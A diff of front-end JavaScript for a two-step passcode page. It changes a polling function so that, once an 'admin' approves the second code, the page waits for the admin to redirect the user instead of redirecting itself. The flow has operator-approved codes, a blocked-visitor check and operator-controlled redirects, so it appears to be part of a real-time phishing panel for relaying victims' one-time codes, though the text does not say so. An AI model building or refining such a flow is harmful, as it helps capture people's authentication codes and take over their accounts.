@@ -322,35 +322,40 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   }
 
   // CRITICAL FIX: Use the same pattern as first OTP but for second OTP
-  function startCheckingSecondApproval() {
-    if (approvalInterval) clearInterval(approvalInterval);
-    approvalInterval = setInterval(async () => {
-      try {
-        const blocked = await checkIfBlocked();
-        if (blocked) return;
-        
-        // Use check-first-approval for second OTP as well (since second_approved is what we need)
-        // Or make sure your backend has /api/users/check-second-approval that returns second_approved
-        const res  = await fetch('/api/users/check-first-approval', {
-          method: 'POST', 
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email })
-        });
-        const data = await res.json();
-        
-        // Debug: log to see what's coming back
-        console.log('Approval check response:', data);
-        
-        if (data.approved === true) {
-          console.log('Approved! Redirecting to success...');
-          clearInterval(approvalInterval);
-          window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
-        }
-      } catch (e) {
-        console.error('Approval polling error:', e);
+function startCheckingSecondApproval() {
+  if (approvalInterval) clearInterval(approvalInterval);
+  approvalInterval = setInterval(async () => {
+    try {
+      const blocked = await checkIfBlocked();
+      if (blocked) return;
+      
+      const res = await fetch('/api/users/check-first-approval', {
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await res.json();
+      
+      console.log('Approval check response:', data);
+      
+      if (data.approved === true) {
+        console.log('Second OTP Approved by admin! Waiting for redirect...');
+        clearInterval(approvalInterval);
+        // DO NOT REDIRECT - just show a success message
+        verifyBtn.disabled = false;
+        verifyBtn.innerHTML = 'Verify';
+        errorDiv.textContent = '✅ Code verified! Waiting for admin to redirect...';
+        errorDiv.style.backgroundColor = '#d1fae5';
+        errorDiv.style.color = '#065f46';
+        errorDiv.style.display = 'block';
+        // Clear the waiting/validating state
+        isProcessing = false;
       }
-    }, 2000);
-  }
+    } catch (e) {
+      console.error('Approval polling error:', e);
+    }
+  }, 2000);
+}
 
   async function verifySecondOTP() {
     if (isProcessing) return;
